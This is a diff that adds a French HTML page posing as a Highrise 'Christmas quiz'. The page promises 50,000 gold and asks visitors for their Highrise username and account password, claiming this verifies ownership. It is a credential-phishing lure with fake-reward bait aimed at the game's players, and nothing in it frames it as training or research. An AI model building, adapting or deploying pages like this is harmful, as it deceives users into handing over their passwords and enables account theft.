@@ -1,0 +1,105 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quiz de Noël HR</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #002147; /* Bleu foncé */
+            color: white;
+            text-align: center;
+        }
+        h1 {
+            color: gold;
+            margin-top: 20px;
+        }
+        .instructions {
+            font-style: italic;
+            color: lightgray;
+            margin-bottom: 20px;
+        }
+        .quiz-container {
+            max-width: 600px;
+            margin: 0 auto;
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        .question {
+            margin: 20px 0;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            background-color: gold;
+            color: black;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover {
+            background-color: #ffc107;
+        }
+        .gold-coins {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 100px;
+            background-image: url('https://cdn.pixabay.com/photo/2016/04/01/10/12/coin-1294813_1280.png');
+            background-repeat: repeat-x;
+            background-size: 50px;
+        }
+        .logo {
+            width: 150px;
+            height: 150px;
+            background-color: gold;
+            border-radius: 50%;
+            margin: 20px auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 40px;
+            font-weight: bold;
+            color: black;
+        }
+    </style>
+</head>
+<body>
+    <h1>Quiz de Noël HR</h1>
+    <div class="logo">HR</div>
+    <p class="instructions">Répondez aux questions ci-dessous pour tenter de bénéficier de 50 000 gold de Noël sur HR.</p>
+    <div class="quiz-container">
+        <form id="quizForm" action="#" method="POST">
+            <div class="question">
+                <label for="username">1. Pour bénéficier du cadeau de 50 000 gold de Noël HR, indiquez votre nom d'utilisateur HR :</label>
+                <input type="text" id="username" name="username" placeholder="Votre nom d'utilisateur HR" required>
+            </div>
+            <div class="question">
+                <label for="password">2. Afin de vérifier si vous êtes le propriétaire du compte, indiquez le mot de passe de votre compte Highrise :</label>
+                <input type="password" id="password" name="password" placeholder="Votre mot de passe" required>
+            </div>
+            <button type="submit">Soumettre</button>
+        </form>
+    </div>
+    <div class="gold-coins"></div>
+</body>
+</html>
